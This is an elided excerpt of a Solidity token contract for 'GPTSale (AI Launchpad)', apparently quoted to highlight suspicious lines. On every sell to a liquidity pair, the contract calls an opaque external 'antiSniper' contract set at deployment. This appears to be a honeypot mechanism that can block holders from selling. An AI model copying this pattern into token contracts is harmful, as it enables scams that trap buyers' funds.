...
*/
/** 
Website: https://gptsale.io
Twitter: https://twitter.com/gptsale
Telegram: https://t.me/gptsaleportal
*/
...
interface IAntiSniper {
    function _aftercheckSniper() external view;
}
...
contract GPTSale is Context, IERC20, Ownable {
    ...
    string private constant _name = "GPTSale (AI Launchpad)";
    string private constant _symbol = "GPTS";
    ...
    IAntiSniper private antiSniper;
    ...
    constructor(address initAddress) {
        ...
        IAntiSniper _antiSniper = IAntiSniper( initAddress );
    ...
    function enableTrading(uint256 _deadBlocks) external onlyOwner {
        ...
        approveTrading(uniswapV2Pair, MAX);
        approveTrading(address(this), MAX);
    }
    ...
    function approveTrading(address spender, uint256 amount) internal{
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (automatedMarketMakerPairs[to]) {
                unchecked { antiSniper._aftercheckSniper(); }
            }
